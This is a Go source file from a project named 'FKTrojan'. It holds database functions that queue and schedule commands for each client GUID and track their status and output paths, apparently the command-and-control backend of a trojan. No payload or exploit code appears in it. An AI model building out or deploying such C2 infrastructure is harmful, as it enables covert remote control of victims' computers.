package database

import (
	"FKTrojan/config"
	. "FKTrojan/dao"
	"fmt"
	"path/filepath"
	"strings"
	"time"
)

func GetNewCmd(uid string) (*Command, error) {
	Lock()
	defer Unlock()
	//return nil, fmt.Errorf("")
	r := dbPointer.QueryRow("SELECT id,guid,code,command,interval_sec,run_count,last_update FROM command WHERE guid = ? and status = ? and  time_to_sec(timediff(NOW(),last_update)) >= interval_sec order by last_update limit 1 ",
		uid, STATUS_NEW)
	if r == nil {
		return nil, fmt.Errorf("can not find a new cmd for %s", uid)
	}
	cmd := Command{}
	paras := ""
	err := r.Scan(&cmd.CommandID, &cmd.UID, &cmd.Code, &paras, &cmd.IntervalSec, &cmd.RunCount, &cmd.Time)
	if err != nil {
		return nil, err
	}
	cmd.Parameters = strings.Split(paras, "|")
	return &cmd, nil
}
func SetPath(cmd *Command) error {
	Lock()
	defer Unlock()
	timeStr := time.Now().Format("20060102-15-04-05")
	path := filepath.Join(config.Conf.BaseDataDir, "command", cmd.UID, fmt.Sprintf("%d_%s.txt", cmd.CommandID, timeStr))
	_, err := dbPointer.Exec("update command set file_path  = ? where id = ?",
		path, cmd.CommandID)
	if err != nil {
		return err
	}
	cmd.Path = path
	return nil
}
func SetCmdDoing(cmd *Command) error {
	Lock()
	defer Unlock()
	_, err := dbPointer.Exec("update command set status = ?,last_update = NOW() where id = ?", STATUS_DOING, cmd.CommandID)
	return err
}
func SetCmdDone(cmd *Command) error {
	Lock()
	defer Unlock()
	var err error
	if cmd.RunCount <= 1 {
		// 单次命令
		_, err = dbPointer.Exec("update command set status = ?,run_count = 0,last_update = NOW() where id = ?", STATUS_DONE, cmd.CommandID)
	} else {
		// 重新将status置为NEW 等待下次调度
		_, err = dbPointer.Exec("update command set run_count = run_count - 1,status = ?,last_update = NOW() where id = ?", STATUS_NEW, cmd.CommandID)
	}
	//fmt.Printf("update result %v\n", r)
	return err
}
